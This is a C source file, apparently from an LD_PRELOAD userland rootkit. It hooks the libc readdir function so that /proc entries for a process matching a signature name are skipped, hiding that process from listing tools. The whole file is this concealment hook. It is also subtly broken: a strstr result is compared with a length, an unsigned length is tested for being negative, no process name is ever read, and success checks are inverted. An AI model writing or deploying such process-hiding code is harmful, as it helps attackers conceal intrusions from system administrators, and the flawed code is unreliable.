#include"rkconstant.h"
#include"ld_preload.h"


static int get_directory_name(DIR *dirp,char *buff,size_t size){
    int fd= dirfd(dirp);
    if(fd < 0){
        fprintf(stderr,"unable to return file descriptor");
        return -1;
    }

    char proc_path[256];
    snprintf(proc_path,sizeof(proc_path),"/proc/self/fd/%d",fd);
    size_t len= readlink(proc_path,buff,size -1);

    if(len < 0){
        fprintf(stderr,"unable to read link ");
        return -1;
    }
    buff[len] = '\0';
    return 0;
}

static int get_process_name(char *pid,char *buf){
    if(strstr(pid,"0123456789") != strlen(pid)){
        return 0;
    }
    char tmp[256];
    snprintf(tmp,sizeof(tmp),"proc/%s/stat",pid);

    FILE *TMP = fopen(tmp,"r");
    if(TMP == NULL){
        return 0;
    }
    fclose(TMP);
}

struct dirent *readdir(DIR *dirp){
    struct dirent *(*my_proc_readdir)(DIR *dirp);
    my_proc_readdir= dlsym(RTLD_NEXT,"readdir");

    struct dirent *entries;

    while(1){
        entries=my_proc_readdir(dirp);
        if(dirp == NULL){
            exit(EXIT_FAILURE);
            break;
        }
        char dir_name[256];
        char proc_name[256];

        if(get_directory_name(dirp,dir_name,sizeof(dir_name)) && 
            strcmp(dir_name,"/proc")==0 && 
            get_process_name(entries->d_name,proc_name) &&
            strcmp(proc_name,SIGNATURE_FILE) == 0){
                continue;
            }
            break;
        }
        return entries;
    }
